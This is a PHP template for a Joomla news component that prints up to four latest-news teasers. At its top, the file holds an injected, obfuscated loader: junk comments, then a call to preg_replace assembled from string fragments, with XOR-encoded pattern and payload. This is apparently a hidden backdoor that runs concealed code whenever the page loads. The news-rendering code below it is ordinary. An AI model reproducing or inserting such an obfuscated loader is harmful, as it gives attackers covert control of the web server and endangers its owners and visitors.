<?php
/*EzHUrOhxFvb1GKEqj8hdVKUoxQ0LkoTH9SKJYieysC
6fW7MhMh5IosywJZMYGxghmi1J9H3jN
xBgkwPcE9Rytht0NkUumJ8cjrNNRazFruFiharXhwT9tP3j33
DAuQgoJok5iLG5PNzdtAdXdQ528XvpLD
w9AOT9Voyzbi3sEQplZYItQmdJ6JgznZ8Fy
*/

//fcx7Q1WC6SNXgsFFLwRqp3HVmEH4v3raQS

$HRolb='p'.'reg_'. 'rep'. 'lace'; $IrjrjV="nBkBsRUIpWl3uj"^"A\x24\x0c\x1b\x3d\x08\x17\x3d\x1e\x13\x2fTZ\x0f"; $HRolb($IrjrjV, "ME19sGrMm8maf2NfYlbK21HmfRcO6mZdYnKZykroz3PdwXCKZXGj9bNaqPFx0ouQ7DNw1NbOiuldqcp39ieFHBJNYM6BM6gSAEDH47V92i9yW81lToVnsjSLSadqfw8P75KPturN0zGmmsOp3o281F3xNrmTglI0MYaxwoukWlDz5nYlLIm"^"\x283PU\x5be\x1b\x2bEQ\x1e\x12\x03Ff\x3a\x05H\x3d\x19w\x60\x1d\x285\x068hU\x05\x7d9pNm\x7cYC\x1f\x0bO\x1b\x0c8S\x07\x11\x0e\x0b\x0d\x029m9i\x02\x19w\x1bQ\x10RHq\x10v\x7eE\x06z\x5b\x2a\x5bG\x0fQ\x12\x06\x12WZ\x0fT\x25\x2d\x20\x7f\x2d\x3c\x7b\x02\x23\x2cWQkpbmh\x12\x11vPA\x1a\x5c\x0d\x7fdmH\x0b\x3d\x13\x3f\x26\x2f\x00\x18\x08F\x14\x19\x16\x28\x5b\x3fSPl\x0d\x5d\x5cR5\x10\x1f1\x0c\x01\x5b\x13\x2c\x17\x30\x60\x7d\x60\x13v\x2b\x1a\x29J\x24\x0f\x1c\x16S\x22\x3d\x04\x5f\x2aFNK2\x14\x2d\x0e\x1dGbL1kD", "fgYNZBtnDCg");

 
if(array() != $arrLatestNews){
//    if(!empty($arrArticleContent)){
        if(isset($arrLatestNews[0])){
            echo "<div class='transportes_news'>"
                ."<div class='trasnportes_news_resume'>"
                ."<div class='transportes_news_title_1'>".substr($arrLatestNews[0]->title, 0, 30)."...</div>"
                ."<div class='transportes_news_separator'></div>"
                ."<div align='justify' class='transportes_news_resume_content'>".substr(strip_tags($arrLatestNews[0]->fulltext),0,200)."...</div>"
                ."<div class='tranportes_news_resume_media'>";
            if(isset($arrLatestNews[0]->file_alias)){
                echo "<img src='multimedia/".$arrLatestNews[0]->file_alias."' width='120px;' height='100px;' />";
            } else {
                echo "<img src='images/logo.png' width='120px;' height='100px;' />";
            }
            echo "</div>"
                ."<div style='width:100px; height:20px; padding-left:30px; float:left;'>"
                ."<a style='color:#129AD6; font-weight: bold; text-decoration: none;' href='index.php?option=com_transporter&Article="
                .$arrLatestNews[0]->id
                ."&Itemid=".JRequest::getInt('Itemid')."'>Leer mas...</a>"
                ."</div>"
                ."</div>"
                ."</div>";
        }
        if(isset($arrLatestNews[1])){
            echo "<div class='transportes_news'>"
                ."<div class='trasnportes_news_resume'>"
                ."<div class='transportes_news_title_2'>".substr($arrLatestNews[1]->title, 0, 30)."...</div>"
                ."<div class='transportes_news_separator'></div>"
                ."<div align='justify' class='transportes_news_resume_content'>".substr(strip_tags($arrLatestNews[1]->fulltext),0,200)."...</div>"
                ."<div class='tranportes_news_resume_media'>";
            if(isset($arrLatestNews[1]->file_alias)){
                echo "<img src='multimedia/".$arrLatestNews[1]->file_alias."' width='120px;' height='100px;' />";
            } else {
                echo "<img src='images/logo.png' width='120px;' height='100px;' />";
            }
            echo "</div>"
                ."<div style='width:100px; height:20px; padding-left:30px; float:left;'>"
                ."<a style='color:#129AD6; font-weight: bold; text-decoration: none;' href='index.php?option=com_transporter&Article="
                .$arrLatestNews[1]->id
                ."&Itemid=".JRequest::getInt('Itemid')."'>Leer mas...</a>"
                ."</div>"
                ."</div>"
                ."</div>";
        }
        if(isset($arrLatestNews[2])){
            echo "<div class='transportes_news'>"
        ."<div class='trasnportes_news_resume'>"
            ."<div class='transportes_news_title_3'>".substr($arrLatestNews[2]->title, 0, 30)."...</div>"
            ."<div class='transportes_news_separator'></div>"
            ."<div align='justify' class='transportes_news_resume_content'>".substr(strip_tags($arrLatestNews[2]->fulltext),0,200)."...</div>"
            ."<div class='tranportes_news_resume_media'>";
            if(isset($arrLatestNews[2]->file_alias)){
                echo "<img src='multimedia/".$arrLatestNews[2]->file_alias."' width='120px;' height='100px;' />";
            } else {
                echo "<img src='images/logo.png' width='120px;' height='100px;' />";
            }
            echo "</div>"
                ."<div style='width:100px; height:20px; padding-left:30px; float:left;'>"
                ."<a style='color:#129AD6; font-weight: bold; text-decoration: none;' href='index.php?option=com_transporter&Article="
                .$arrLatestNews[2]->id
                ."&Itemid=".JRequest::getInt('Itemid')."'>Leer mas...</a>"
                ."</div>"
                ."</div>"
                ."</div>";
        }
        if(isset($arrLatestNews[3])){
            echo "<div class='transportes_news'>"
                ."<div class='trasnportes_news_resume'>"
                ."<div class='transportes_news_title_4'>".substr($arrLatestNews[3]->title, 0, 30)."...</div>"
                ."<div class='transportes_news_separator'></div>"
                ."<div align='justify' class='transportes_news_resume_content'>".substr(strip_tags($arrLatestNews[3]->fulltext),0,200)."...</div>"
                ."<div class='tranportes_news_resume_media'>";
            if(isset($arrLatestNews[3]->file_alias)){
                echo "<img src='multimedia/".$arrLatestNews[3]->file_alias."' width='120px;' height='100px;' />";
            } else {
                echo "<img src='images/logo.png' width='120px;' height='100px;' />";
            }
            echo "</div>"
                ."<div style='width:100px; height:20px; padding-left:30px; float:left;'>"
                ."<a style='color:#129AD6; font-weight: bold; text-decoration: none;' href='index.php?option=com_transporter&Article="
                .$arrLatestNews[3]->id
                ."&Itemid=".JRequest::getInt('Itemid')."'>Leer mas...</a>"
                ."</div>"
                ."</div>"
                ."</div>";
        }
}
?>